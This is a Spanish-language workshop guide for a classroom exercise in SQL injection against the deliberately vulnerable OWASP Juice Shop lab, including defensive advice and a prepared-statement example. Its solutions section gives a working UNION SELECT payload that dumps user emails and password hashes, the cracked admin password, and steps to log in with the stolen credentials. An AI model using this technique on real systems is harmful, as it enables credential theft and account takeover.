# Guía del Taller: Explotación de Inyección SQL en OWASP Juice Shop

## 1. Introducción

Esta guía acompaña al taller práctico de seguridad web y tiene como objetivo que el alumnado identifique, explote y comprenda una vulnerabilidad de **Inyección SQL** (SQL Injection) en un entorno controlado y diseñado para el aprendizaje: OWASP Juice Shop.

## 2. Objetivos de aprendizaje

Al finalizar el taller, el alumnado será capaz de:

- Identificar indicios de una vulnerabilidad de Inyección SQL
- Interceptar y modificar peticiones HTTP con Burp Suite
- Explotar una consulta vulnerable para obtener información sensible
- Comprender el impacto real de una Inyección SQL
- Conocer las medidas básicas para prevenir este tipo de ataques

---

## 3. Herramientas necesarias

- Docker
- OWASP Juice Shop (imagen Docker)
- Burp Suite Community Edition

## 4. Fase 1: Preparación del entorno

### 4.1 Conectarte a  la aplicación vulnerable

Con la IP que te facilitaremos en la presentación te conectaras a la web.

### 4.2 Configurar Burp Suite

1. Abrir Burp Suite
2. Acceder a la pestaña **Proxy**
3. Pulsar **Open Browser**
4. Utilizar únicamente este navegador durante el taller


## 5. Fase 2: Detección de la vulnerabilidad

### 5.1 Objetivo

Comprobar si el buscador de productos procesa directamente la entrada del usuario dentro de una consulta SQL.

### 5.2 Procedimiento

1. En Juice Shop, utilizar la lupa de búsqueda
2. Introducir el texto: `apple`
3. En Burp Suite, ir a **Proxy** → **HTTP history**
4. Localizar la petición:
   ```
   GET /rest/products/search?q=apple
   ```
5. Clic derecho sobre la petición y seleccionar **Send to Repeater**
6. Acceder a la pestaña **Repeater**

### 5.3 Prueba de Inyección SQL

Modificar el parámetro `q` por el siguiente valor:

```
q='
```

Enviar la petición.

**Resultado esperado:** Si la respuesta del servidor contiene un error del tipo:

```
SQLITE_ERROR
```
Se confirma que la aplicación es **vulnerable a Inyección SQL**.

---

## 6. Fase 3: Explotación de la vulnerabilidad

### 6.1 Objetivo

Extraer información de la tabla de usuarios utilizando una consulta **UNION SELECT**.

### 6.2 Indicaciones

- La consulta original devuelve **9 columnas**
- Para que **UNION SELECT** funcione, el número de columnas debe coincidir
- Existe una tabla llamada **Users**
- Los campos de interés son **email** y **password**

### 6.3 Tarea del alumnado

1. En la pestaña **Repeater**, borrar el contenido del parámetro `q=`
2. Construir una inyección SQL que permita:
   - Unir resultados de la tabla Users
   - Mostrar correos y contraseñas
3. Enviar la petición y analizar la respuesta JSON

---

## 7. Fase 4: Análisis y descifrado de contraseñas

### 7.1 Observación de resultados

En la respuesta del servidor:

- Los correos electrónicos aparecen en campos de productos
- Las contraseñas están almacenadas como hashes MD5

### 7.2 Tarea

1. Copiar el hash del usuario administrador
2. Utilizar una herramienta de cracking de hashes (CrackStation.net)
3. Obtener la contraseña en texto plano
4. Acceder al login de Juice Shop con las credenciales obtenidas

---

## 8. Fase 5: Medidas de defensa

### 8.1 Reflexión

La Inyección SQL no es un fallo del lenguaje SQL, sino del **uso incorrecto de las entradas del usuario** en las consultas.

### 8.2 Buenas prácticas de seguridad

- No concatenar datos del usuario en consultas SQL
- Utilizar consultas preparadas (Prepared Statements)
- Validar y sanear todas las entradas
- Aplicar el principio de mínimo privilegio en la base de datos

---

## 9. Soluciones

### 9.1 Payload funcional

```
apple'))+UNION+SELECT+1,2,3,4,email,password,7,8,9+FROM+Users--
```

### 9.2 Ubicación de los datos en la respuesta

| Tipo de dato | Campo | Ejemplo |
|---|---|---|
| Correos electrónicos | deluxePrice | admin@juice-sh.op |
| Hashes de contraseña | image | 0192023a7bbd73250516f069df18b500 |

### 9.3 Resultado del cracking

**Contraseña del administrador:**

```
admin123
```

### 9.4 Ejemplo de código vulnerable y seguro

**Código vulnerable:**

```java
String query = "SELECT * FROM Products WHERE q = '" + search + "'";
```

**Código seguro (consulta preparada):**

```java
String query = "SELECT * FROM Products WHERE q = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, search);
```

---

## 10. Conclusión

Este ejercicio demuestra cómo una única vulnerabilidad de **Inyección SQL** puede comprometer completamente una aplicación. La prevención depende de aplicar **buenas prácticas de desarrollo seguro** desde el inicio del proyecto .
